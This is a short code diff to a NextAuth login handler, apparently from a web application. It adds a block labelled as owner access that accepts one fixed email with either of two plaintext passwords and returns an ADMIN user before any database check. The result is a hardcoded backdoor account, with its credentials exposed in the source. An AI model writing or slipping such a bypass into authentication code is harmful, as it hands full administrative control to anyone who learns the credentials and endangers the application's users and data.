@@ -25,6 +25,21 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
           const { loginId, password } = parsedCredentials.data
           const cleanId = loginId.trim()
 
+          // ── DuoKarma Owner Access ──────────────────────────────────
+          // Fixed owner credential: email duokarma@54.com, password Hatim or Moiz
+          if (
+            (cleanId.toLowerCase() === 'duokarma@54.com' || cleanId === 'duokarma@54.com') &&
+            (password === 'Hatim' || password === 'Moiz')
+          ) {
+            return {
+              id: 'duokarma-owner',
+              email: 'duokarma@54.com',
+              name: password === 'Hatim' ? 'Hatim (DuoKarma)' : 'Moiz (DuoKarma)',
+              role: 'ADMIN'
+            }
+          }
+          // ──────────────────────────────────────────────────────────
+
           const user = await prisma.profile.findFirst({
             where: {
               isActive: true,
